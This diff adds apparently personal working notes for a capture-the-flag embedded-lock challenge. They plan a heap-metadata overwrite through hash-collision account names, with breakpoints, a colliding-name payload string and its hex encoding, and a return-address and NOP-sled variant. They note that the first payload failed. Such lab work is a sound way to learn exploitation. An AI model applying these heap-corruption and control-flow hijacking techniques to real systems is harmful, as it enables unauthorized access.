@@ -1,0 +1,74 @@
+Commands: 
+  - access <name> <pin>
+  - new <name> <pin>
+  
+Maximum name length is 0x20 (including terminator), but only 0xf characters are stored in the hash table.
+
+create_hash_table(load_factor_r15 = 3, initial_capacity_r14 = 5)
+
+break 48d4
+break 471c
+break 4832
+
+=> Hashtable's bucket doesn't get resized if the hashes fall in the same bucket. This allows overwriting of 
+   malloc structures.
+
+new BBAB 1;new HU4H 2;new j62G 3;new dfdC 4;new T4r3 5;new tSp2 6;new bla1 1;new bla2 2;new bla3 3;new bla4 4;new bla5 5;new bla6 6;
+
+new u5Op 7;new rMj0 8;new EmLe 9;new OHFN 10;
+
+Gt3g
+
+new TB5g 1;new nNAA 2;new pSeb 3;new orfC 4;new 2a8I 5;new bla6 1;new 2a8I 6;new bla2 2;new bla3 3;new bla4 4;new bla5 5;new bla1 6;
+
+TB5g
+nNAA
+pSeb
+orfC
+2a8I
+zsFM
+QZNe
+UfZi
+0YpG
+vg9h
+
+
+
+=> size_flags % 2 == 0
+=> 
+
+Idea: Construct an input that uses malloc to overwrite the pin field of an entry in a later bucket with the authorization
+bit. The address of the pin field is encoded in the size field (*2). The lowest bit must be zero.
+
+So first 5 newly created accounts are dummies to fill the bucket. Sixth account overwrites the malloc structure. Seventh account creates the username and pin field that is going to be overwritten with the just deposited fake malloc info.
+Four more fake accounts cause the hash table to expand. Malloc is going to use our fake information and overwrite the pin
+field, this time with the high bit set. Et voila ...
+
+break 46c8
+
+First of all, the account to compromise is created in the second bucket. Then,
+F5 entries are created account with same hash to fill the first bucket. Sixth account overwrites malloc struct, first 6 bytes are irrelevant. Rest of the name is the new name used for the compromised account, and overwrites the name field in the second bucket. Pin of this account should be 0 to terminate the name string. Seventh account's name's first four bytes are irrelevant. Fifth and sixth bytes form pin, sixth byte's high bit must be set (authorized account).
+
+                |--|--|--|--|--|--|--|--| |--|--|--|--|
+Regular layout: | malloc | name                    |Pn|
+Forged layout:  | name                  |Pin |name  
+
+
+new bla6 1;new TB5g 1;new nNAA 1;new pSeb 1;new orfC 1;new 2a8I 1;new tllB0cbla6 0;new 5LaT\x3f\x95 0;access bla6 aaa;
+6e657720626c613620313b6e6577205442356720313b6e6577206e4e414120313b6e6577207053656220313b6e6577206f72664320313b6e6577203261384920313b6e657720746c6c423063626c613620303b6e657720354c61543f9520303b61636365737320626c6136206161613b
+
+
+DOESN'T WORK. No interrupt to unlock the deadbolt.
+
+
+Overwrite return from add_to_table at 0x3dea.
+
+Modify malloc information to with prev pointer point to 0x3dea - 2.
+Next pointer points to nop sledge, e.g., 0x3e21. Nop sledge contains a push 0x7f; call INT sequence.
+
+Doesn't work, getting heap exhausted. Redirect bucket pointer of one empty bucket to point to stack to overwrite directly.
+
+
+
+e83d3e2130
+
